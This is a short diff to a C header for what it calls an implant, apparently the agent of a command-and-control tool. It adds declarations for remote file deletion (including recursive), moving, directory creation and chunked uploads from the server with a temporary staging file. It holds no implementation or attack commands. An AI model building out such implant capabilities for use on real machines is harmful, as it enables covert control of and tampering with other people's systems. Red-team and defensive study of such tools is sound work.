@@ -8,6 +8,7 @@
 #define FILE_CHUNK    (48 * 1000) /* one heartbeat of file data; must stay under u16 TLV */
 #define FILE_MAX      (20 * 1024 * 1024)
 #define DIR_LIST_CAP  (60 * 1000) /* one directory listing; stays under u16 TLV with its header */
+#define WRITE_TMP     ".mina-tmp" /* upload staging file next to the target */
 #define RESP_MAX_BODY (2 * 1024 * 1024)
 #define WIRE_MAX      (RESP_MAX_BODY + 65536) /* headers plus a capped body */
 #define RESULT_CAP    (1024 * 1024)           /* accumulated task output held in memory */
@@ -44,6 +45,17 @@ int  read_file_chunk(const char *path, uint32_t offset, unsigned char **out, siz
    err_code: 0 ok, 1 missing, 2 denied/other, 3 not a directory.
    *truncated is set when entries did not fit the output cap. */
 int  list_dir(const char *path, unsigned char **out, size_t *out_len, int *err_code, int *truncated);
+/* File operations. err_code: 0 ok, 1 missing, 2 denied/other, 3 too big,
+   4 target changed (conflict), 5 already exists, 6 needs recursive. */
+int  fs_rm(const char *path, int recursive, int *err_code);
+int  fs_mv(const char *src, const char *dst, int *err_code);
+int  fs_mkdir(const char *path, int *err_code);
+/* Chunked server->implant upload. Chunk 0 runs the conflict check (unless
+   force), creates path + WRITE_TMP, later chunks append at offset, and the
+   final chunk applies the original mode and renames into place. */
+int  fs_write_chunk(const char *path, uint32_t offset, uint64_t total,
+                    int64_t expect_size, int64_t expect_mtime, int force,
+                    const unsigned char *data, size_t data_len, int *err_code);
 void host_info(char *hostname, size_t hn, char *username, size_t un,
                char *os, size_t on, char *arch, size_t an, uint32_t *pid);
 
